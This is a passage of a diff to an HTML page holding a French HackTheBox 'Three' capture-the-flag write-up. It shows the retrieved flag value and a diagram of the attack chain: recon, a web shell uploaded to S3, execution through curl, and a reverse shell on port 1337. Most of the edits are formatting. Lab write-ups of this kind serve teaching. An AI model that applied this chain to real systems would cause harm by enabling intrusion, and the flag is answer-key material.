+    <p>Une fois dans le shell, on navigue vers <code>/var/www</code> et on lit <code>flag.txt</code> :</p>
     <div class="terminal-frame">
       <div class="terminal-bar"><div class="t-dot t-dot-red"></div><div class="t-dot t-dot-amber"></div><div class="t-dot t-dot-green"></div><span class="terminal-bar-label">Flag</span></div>
-      <pre style="padding:.8rem;margin:0;">
-www-data@three:/var/www$ cat flag.txt
-a980d99281a28d638ac68b9bf9453c2b
-      </pre>
+      <pre>www-data@three:/var/www$ cat flag.txt
+a980d99281a28d638ac68b9bf9453c2b</pre>
     </div>
     <div class="flag-box">
       <div class="flag-label">Flag</div>
@@ -697,7 +747,7 @@ a980d99281a28d638ac68b9bf9453c2b
     <div class="section-label">Phase <span>07</span></div>
     <h2 class="section-title">Analyse de l’architecture C2</h2>
     <p>
-      L’attaque utilisée dans ce challenge met en œuvre une architecture <strong>Command & Control (C2)</strong> minimaliste. Voici les composants :
+      L’attaque utilisée dans ce challenge met en œuvre une architecture <strong>Command &amp; Control (C2)</strong> minimaliste. Voici les composants :
     </p>
     <div class="glossary-grid">
       <div class="glossary-card">
@@ -722,17 +772,11 @@ a980d99281a28d638ac68b9bf9453c2b
           .label { fill: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 12px; text-anchor: middle; dominant-baseline: middle; }
           .arrow { stroke: var(--cyan); stroke-width: 2; fill: none; marker-end: url(#arrowhead); }
           .arrow-label { fill: var(--muted); font-family: 'JetBrains Mono', monospace; font-size: 10px; text-anchor: middle; }
-          @keyframes dash {
-            to { stroke-dashoffset: -20; }
-          }
+          @keyframes dash { to { stroke-dashoffset: -20; } }
           .animated-arrow { stroke-dasharray: 6 4; animation: dash 1s linear infinite; }
           marker#arrowhead { fill: var(--cyan); }
         </style>
-        <defs>
-          <marker id="arrowhead" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto">
-            <path d="M 0 0 L 10 5 L 0 10 Z" />
-          </marker>
-        </defs>
+        <defs><marker id="arrowhead" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M 0 0 L 10 5 L 0 10 Z"/></marker></defs>
         <!-- Nodes -->
         <rect x="50" y="150" width="120" height="60" rx="8" class="node" />
         <text x="110" y="175" class="label">Attaquant</text>
@@ -751,22 +795,18 @@ a980d99281a28d638ac68b9bf9453c2b
         <text x="690" y="195" class="label" style="font-size:9px;fill:var(--muted);">(Attaquant)</text>
 
         <!-- Arrows -->
-        <!-- 1. Enumeration -->
         <line x1="170" y1="170" x2="330" y2="80" class="arrow animated-arrow" />
         <text x="250" y="110" class="arrow-label">1. Découverte</text>
         <text x="250" y="125" class="arrow-label" style="font-size:8px;">(nmap, gobuster)</text>
 
-        <!-- 2. Upload shell -->
         <line x1="170" y1="190" x2="330" y2="330" class="arrow animated-arrow" />
         <text x="250" y="280" class="arrow-label">2. Upload shell.php</text>
         <text x="250" y="295" class="arrow-label" style="font-size:8px;">(aws s3 cp)</text>
 
-        <!-- 3. Request to shell -->
         <line x1="400" y1="110" x2="400" y2="290" class="arrow" style="stroke:var(--amber);" />
         <text x="410" y="200" class="arrow-label" style="fill:var(--amber);">3. Exécution</text>
         <text x="410" y="215" class="arrow-label" style="font-size:8px;fill:var(--amber);">(curl / shell.php)</text>
 
-        <!-- 4. Reverse shell -->
         <path d="M 460 80 C 550 30, 600 150, 690 170" class="arrow animated-arrow" style="stroke:var(--red);" />
         <text x="570" y="70" class="arrow-label" style="fill:var(--red);">4. Reverse shell</text>
         <text x="570" y="85" class="arrow-label" style="font-size:8px;fill:var(--red);">(TCP 1337)</text>
@@ -809,9 +849,7 @@ a980d99281a28d638ac68b9bf9453c2b
       Rédigé par <strong style="color: var(--cyan);">SPECTRA MZ</strong>
       &nbsp;·&nbsp; HackTheBox &nbsp;·&nbsp; Three
     </div>
-    <div class="footer-badge">
-      <span>HTB</span> · Linux · Easy
-    </div>
+    <div class="footer-badge"><span>HTB</span> · Linux · Easy</div>
   </footer>
 
 </div>
@@ -885,7 +923,6 @@ a980d99281a28d638ac68b9bf9453c2b
     navigator.clipboard.writeText(url).then(() => {
       alert('Lien copié dans le presse-papiers !');
     }).catch(() => {
-      // Fallback
       const input = document.createElement('input');
       input.value = url;
       document.body.appendChild(input);
@@ -898,9 +935,7 @@ a980d99281a28d638ac68b9bf9453c2b
 
   function sharePage() {
     const shareSection = document.getElementById('share-buttons');
-    if (shareSection) {
-      shareSection.scrollIntoView({ behavior: 'smooth' });
-    }
+    if (shareSection) shareSection.scrollIntoView({ behavior: 'smooth' });
     if (navigator.share) {
       navigator.share({
         title: document.title,
